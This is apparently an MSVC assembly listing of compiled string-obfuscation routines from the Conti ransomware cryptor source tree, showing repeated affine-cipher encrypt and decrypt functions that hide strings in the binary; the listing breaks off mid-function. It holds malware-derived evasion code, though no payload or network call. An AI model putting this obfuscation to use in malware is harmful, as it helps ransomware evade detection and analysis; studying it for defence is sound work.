;	COMDAT ?isDecrypted@?$MetaBuffer@$0BB@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BB@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ PROC ; MetaBuffer<17,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BB@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<17,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0N@$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0N@$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z PROC ; MetaBuffer<13,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 32 00 00 00	 mov	 ecx, 50			; 00000032H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 27	 imul	 r8d, ecx, 39		; 00000027H

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0N@$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<13,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0N@$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0N@$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z PROC ; MetaBuffer<13,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 0d	 imul	 r8d, eax, 13
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 32	 add	 r8d, 50			; 00000032H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0N@$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<13,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0N@$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0N@$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ PROC ; MetaBuffer<13,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0N@$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<13,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EJ@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0EJ@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z PROC ; MetaBuffer<73,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 45 00 00 00	 mov	 ecx, 69			; 00000045H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 89	 lea	 r8d, DWORD PTR [rcx+rcx*4]
  00013	41 c1 e0 03	 shl	 r8d, 3

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EJ@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<73,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EJ@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EJ@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z PROC ; MetaBuffer<73,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 49	 imul	 r8d, eax, 73		; 00000049H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 45	 add	 r8d, 69			; 00000045H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EJ@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<73,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EJ@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EJ@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ PROC ; MetaBuffer<73,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EJ@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<73,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0CA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BN@$0CA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,32,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 20 00 00 00	 mov	 ecx, 32			; 00000020H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 23	 imul	 r8d, ecx, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0CA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,32,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BN@$0CA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BN@$0CA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,32,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 1d	 imul	 r8d, eax, 29
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 20	 add	 r8d, 32			; 00000020H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BN@$0CA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,32,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BN@$0CA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BN@$0CA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<29,32,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BN@$0CA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<29,32,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CP@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CP@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z PROC ; MetaBuffer<47,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 17 00 00 00	 mov	 ecx, 23
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 1b	 imul	 r8d, ecx, 27

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CP@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<47,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CP@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CP@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z PROC ; MetaBuffer<47,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 2f	 imul	 r8d, eax, 47		; 0000002fH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 17	 add	 r8d, 23
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CP@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<47,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CP@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CP@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ PROC ; MetaBuffer<47,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CP@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<47,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FJ@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0FJ@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<89,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 8d 04 80	 lea	 r8d, DWORD PTR [rax+rax*4]

; 40   :     return (a % n + n) % n;

  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000c	45 03 c0	 add	 r8d, r8d

; 40   :     return (a % n + n) % n;

  0000f	41 f7 e0	 mul	 r8d
  00012	41 8b c0	 mov	 eax, r8d
  00015	2b c2		 sub	 eax, edx
  00017	d1 e8		 shr	 eax, 1
  00019	03 c2		 add	 eax, edx
  0001b	c1 e8 06	 shr	 eax, 6
  0001e	6b c0 7f	 imul	 eax, eax, 127		; 0000007fH
  00021	44 2b c0	 sub	 r8d, eax
  00024	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00029	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002d	41 f7 e8	 imul	 r8d
  00030	41 03 d0	 add	 edx, r8d
  00033	c1 fa 06	 sar	 edx, 6
  00036	8b ca		 mov	 ecx, edx
  00038	c1 e9 1f	 shr	 ecx, 31
  0003b	03 d1		 add	 edx, ecx
  0003d	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00040	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00043	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00047	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FJ@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<89,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0FJ@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0FJ@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<89,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 59	 imul	 r8d, eax, 89		; 00000059H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 f7 e0	 mul	 r8d
  0000f	41 8b c8	 mov	 ecx, r8d
  00012	2b ca		 sub	 ecx, edx
  00014	d1 e9		 shr	 ecx, 1
  00016	03 ca		 add	 ecx, edx
  00018	c1 e9 06	 shr	 ecx, 6
  0001b	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  0001e	44 2b c1	 sub	 r8d, ecx
  00021	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00025	c3		 ret	 0
?encrypt@?$MetaBuffer@$0FJ@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<89,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0FJ@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0FJ@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<89,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0FJ@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<89,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0ED@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 2f 00 00 00	 mov	 ecx, 47			; 0000002fH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
